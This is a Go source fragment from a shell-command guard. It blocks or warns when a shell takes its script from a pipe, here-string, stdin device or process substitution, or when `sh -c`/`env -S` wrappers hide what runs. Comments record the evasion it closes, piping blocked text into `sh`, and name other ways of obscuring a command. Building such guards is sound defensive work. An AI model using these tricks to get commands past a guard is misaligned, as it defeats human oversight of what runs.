var stdinDevices = []string{"/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"}

// scriptIsStream reports whether a shell's script operand is a stream: a
// process substitution, or the stdin device while stdin is a stream. An
// unknown operand is one when it can print as either.
func scriptIsStream(op string, stdin bool) bool {
	if wordCouldBe(op, procSubOperand) {
		return true
	}
	if !stdin {
		return false
	}
	for _, dev := range stdinDevices {
		if wordCouldBe(op, dev) {
			return true
		}
	}
	return false
}

// shellReadsStream walks a shell's arguments the way its own parser reads them:
// `-o` and `-O` take a value, as do `--rcfile` and `--init-file`, and
// `--version` or `--help` prints and exits without reading anything. Each
// unknown word is read every way readWord reads it, and a stream any reading
// runs is enough.
func shellReadsStream(args []string, stdin bool) bool {
	seen := map[int]bool{}
	stack := []int{0}
	for len(stack) > 0 {
		i := stack[len(stack)-1]
		stack = stack[:len(stack)-1]
		if seen[i] {
			continue
		}
		seen[i] = true
		tally(1)
		if i >= len(args) {
			if stdin {
				return true // no script operand: the script is standard input
			}
			continue
		}
		a := args[i]
		switch {
		case a == "--":
			if i+1 >= len(args) {
				if stdin {
					return true
				}
			} else if scriptIsStream(args[i+1], stdin) {
				return true
			}
		case a == "-":
			if stdin {
				return true
			}
		case a == "--version" || a == "--help":
		case strings.HasPrefix(a, "<<<"):
			// A here-string is the stream itself, kept as words by the
			// tokenizer: the operator, and its text when not glued to it.
			if a == "<<<" {
				stack = append(stack, i+2)
			} else {
				stack = append(stack, i+1)
			}
		case isUnknown(a):
			r := readWord(a, shellStreamValueOptions)
			if r.vanish || r.flag {
				stack = append(stack, i+1)
			}
			if r.takes {
				stack = append(stack, i+2)
			}
			if (r.flag || r.takes) && clusterCouldCarry(a, 's') && stdin {
				return true
			}
			if r.operand && scriptIsStream(a, stdin) {
				return true
			}
		case a == "--rcfile" || a == "--init-file":
			stack = append(stack, i+2)
		case strings.HasPrefix(a, "--"):
			// --norc, --noprofile, --posix, --login: no value.
			stack = append(stack, i+1)
		case len(a) >= 2 && (a[0] == '-' || a[0] == '+'):
			switch cluster := a[1:]; {
			case strings.ContainsRune(cluster, 'c'):
				// a -c string: the payload reading takes it
			case strings.ContainsRune(cluster, 's'):
				if stdin {
					return true
				}
			case strings.ContainsAny(cluster, "oO"):
				stack = append(stack, i+2)
			default:
				stack = append(stack, i+1)
			}
		default:
			if scriptIsStream(a, stdin) {
				return true // the first operand is the script file
			}
		}
	}
	return false
}

// shellStreamValueOptions are the shell options shellReadsStream steps a value
// for.
var shellStreamValueOptions = []string{"-o", "-O", "+o", "+O", "--rcfile", "--init-file"}

// sourceReadsStream reports whether `source`/`.` is handed a stream as the
// file it reads: its first operand, after an optional `--`.
func sourceReadsStream(args []string, stdin bool) bool {
	for i, a := range args {
		if a == "--" && i == 0 {
			continue
		}
		return scriptIsStream(a, stdin)
	}
	return false
}

// interpreterStreamSignal is the fail-closed verdict for a shell reading its
// script from a pipe, a here-document, a here-string, the stdin device or a
// process substitution. It is a BLOCK because
// the stream is text the guard read as data: `printf '<blocker>' | sh` runs the
// blocker, and every blocker in the registry was one pipe away from a silent
// allow (iss-2609251640462464).
func interpreterStreamSignal() payloadSignal {
	return payloadSignal{
		id:      interpreterStreamEntryID,
		verdict: VerdictBlock,
		family:  familyInterpreterStream,
		reason: "This command hands a shell its script as a stream — through a pipe, a here-document, a here-string, " +
			"the stdin device or a process substitution — so the commands that shell runs are text the guard read as data and has not checked.",
		successor: "Run the commands directly, or pass them with `sh -c '<commands>'` so the guard reads them; " +
			"to run a script, save it and run it as a file after reading it.",
	}
}

// depthBlockSignal is the fail-closed verdict for a family member nested past the
// depth budget.
func depthBlockSignal(family string) payloadSignal {
	return payloadSignal{
		verdict: VerdictBlock,
		family:  family,
		reason: "Execute-a-string wrappers are nested past the depth the guard can follow, " +
			"so a hazard buried deeper cannot be checked.",
		successor: "Flatten the nested `sh -c`/`env -S` layers so the command the guard checks is the command that runs.",
	}
}

// envSpecialBlockSignal is the fail-closed verdict for an env -S value that is not
// provably a plain command.
func envSpecialBlockSignal() payloadSignal {
	return payloadSignal{
		verdict: VerdictBlock,
		family:  familyEnvS,
		reason: "`env -S`/`--split-string` carries a value the guard cannot read as a plain command, " +
			"so what it would run cannot be checked.",
		successor: "Rewrite the command without `env -S`/`--split-string` so the guard can read what runs; " +
			"the committed registry-disable is the reviewable escape if this is intentional.",
	}
}

// shellUnresolvedSignal is the loud-warn verdict for a shell `-c` invocation
// whose command-string operand could not be located behind its options — the
// fail-safe that keeps an option-obscured payload visible instead of silently
// allowed.
func shellUnresolvedSignal() payloadSignal {
	return payloadSignal{
		verdict: VerdictWarn,
		family:  familyShell,
		reason: "This `sh -c`/`bash -c` invocation places options after `-c` that obscure which operand is the command string, " +
			"so the guard cannot read the command it will actually run.",
		successor: "Put the command string immediately after `-c`, before any other options, so the guard can check it.",
	}
}

// shellWarnSignal is the loud-warn verdict for an uninspectable shell payload.
func shellWarnSignal() payloadSignal {
	return payloadSignal{
		verdict: VerdictWarn,
		family:  familyShell,
		reason: "This `sh -c`/`bash -c` payload contains a substitution or a pipe into an interpreter, " +
			"so the guard cannot read the command it will actually run.",
		successor: "If this is intentional, run it as written; prefer spelling the command out so the guard can check it.",
	}
}
